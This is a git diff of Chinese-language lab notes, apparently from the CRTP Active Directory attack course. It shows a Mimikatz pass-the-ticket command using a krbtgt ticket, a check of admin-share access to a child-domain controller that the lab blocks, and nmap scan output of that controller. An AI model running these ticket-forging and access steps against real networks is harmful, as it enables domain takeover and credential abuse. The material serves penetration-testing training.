@@ -1216,16 +1216,38 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_p2c_tkt.kirbi"'
 ```
 
 使用下面两个命令之一验证上面操作是否成功
-```
-gwmi -class win32_operatingsystem -ComputerName us-dc.us.dollarcorp.moneycorp.local
-```
-或者
+
 ```
 ls \\us-dc.us.dollarcorp.moneycorp.local\c$
 ```
 
+会报错。
 
+跟助教沟通，CRTP的这个lab环境不允许访问子域的DC。但是上面的方法应该是没错的。
 
+```
+C:\Windows\system32>nmap -sV -Pn 172.16.9.1
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-22 23:28 Pacific Standard Time
+Nmap scan report for 172.16.9.1
+Host is up (0.0018s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-23 07:28:42Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: moneycorp.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: us)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: moneycorp.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: US-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.82 seconds
+```
 
 
 
